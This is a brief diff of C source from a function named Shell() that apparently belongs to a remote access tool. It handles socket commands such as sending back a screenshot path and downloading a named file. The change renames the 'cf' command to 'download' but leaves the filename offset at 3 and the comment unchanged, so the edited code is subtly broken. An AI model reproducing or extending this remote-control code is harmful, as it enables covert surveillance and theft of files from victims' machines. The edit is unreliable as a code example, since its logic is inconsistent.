@@ -134,7 +134,7 @@ void Shell()
       // Send back path of screenshot
       send(sock, suc, sizeof(suc), 0);
     }
-    else if (strncmp("cf ", buffer, 3) == 0)
+    else if (strncmp("download ", buffer, 9) == 0)
     {
       // Get the filename after cf
       char *filename = str_cut(buffer, 3, 100);
